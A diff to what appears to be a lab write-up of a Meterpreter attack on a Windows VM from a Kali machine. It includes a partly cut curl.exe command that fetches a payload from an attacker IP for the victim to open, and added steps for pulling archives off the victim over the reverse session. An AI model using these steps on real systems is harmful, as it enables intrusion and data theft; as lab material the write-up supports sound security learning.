@@ -97,3 +97,10 @@ On Windows download the payload and open it: ```curl.exe http://192.169.92.136:8
 
 <img width="426" height="189" alt="image" src="https://github.com/user-attachments/assets/83fde88d-a74f-4c74-9ef4-fe09483b55eb" />
 
+Now from our kali machine, in the meterpreter session, download the archives.
+
+Tip for troubleshooting: I had spawned a shell in my meterpreter instance to prove I had created a reverse connection to the Windows VM. I had to drop out of that shell to download the files.
+
+<img width="735" height="294" alt="image" src="https://github.com/user-attachments/assets/412449d3-472d-445c-8e27-cbfb97106bba" />
+
+<img width="424" height="82" alt="image" src="https://github.com/user-attachments/assets/b6220f0f-acdb-4a66-8260-038a980c3719" />
